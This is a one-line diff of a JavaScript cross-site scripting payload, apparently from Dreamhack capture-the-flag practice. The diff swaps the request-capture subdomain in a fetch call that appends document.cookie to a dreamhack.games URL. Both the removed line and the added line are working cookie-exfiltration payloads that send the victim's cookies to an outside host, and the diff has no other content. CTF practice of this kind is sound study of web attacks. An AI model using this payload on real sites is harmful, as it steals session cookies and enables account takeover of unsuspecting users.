@@ -1,1 +1,1 @@
-fetch('https://jsonboe.request.dreamhack.games'+document.cookie);
+fetch('https://zxzhncm.request.dreamhack.games/'+document.cookie);
